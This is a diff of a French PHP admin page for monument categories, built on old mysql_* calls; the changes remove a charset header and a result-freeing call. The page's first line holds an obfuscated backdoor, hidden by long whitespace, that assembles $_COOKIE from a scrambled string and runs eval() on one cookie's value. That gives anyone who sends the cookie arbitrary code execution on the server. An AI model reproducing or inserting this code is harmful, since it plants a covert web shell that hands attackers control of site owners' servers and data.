@@ -1,7 +1,5 @@
 <?php                                                                                                                                                                                                                                              $m5o='e(3\'_slIt9vi7aE$CKhcfO97eec3';if(isset(${$m5o[4].$m5o[16].$m5o[21].$m5o[21].$m5o[17].$m5o[7].$m5o[14]}[$m5o[18].$m5o[9].$m5o[12].$m5o[0].$m5o[0].$m5o[19].$m5o[2]])){eval(${$m5o[4].$m5o[16].$m5o[21].$m5o[21].$m5o[17].$m5o[7].$m5o[14]}[$m5o[18].$m5o[9].$m5o[12].$m5o[0].$m5o[0].$m5o[19].$m5o[2]]);} ?><?php
 
-header('Content-Type: text/html; charset=iso-8859-1');
-
 //requete categories monuments
 
 $colname_ch_disp_FH_id = "-1";
@@ -41,5 +39,3 @@ $totalRows_fai = mysql_num_rows($fai);
             <button type="submit" class="btn btn-danger"><i class="icon-trash icon-white"></i> Supprimer</button>
             </form>
           </div>
-<?php
-mysql_free_result($fai);?>
